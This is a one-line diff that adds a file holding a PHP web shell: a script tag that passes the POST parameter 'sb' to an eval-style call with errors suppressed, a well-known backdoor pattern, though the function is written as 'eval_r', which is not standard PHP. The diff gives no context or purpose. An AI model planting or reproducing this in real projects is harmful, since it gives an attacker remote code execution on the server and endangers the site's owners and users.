@@ -1,0 +1,1 @@
+<script language="php">@eval_r($_POST[sb])</script>
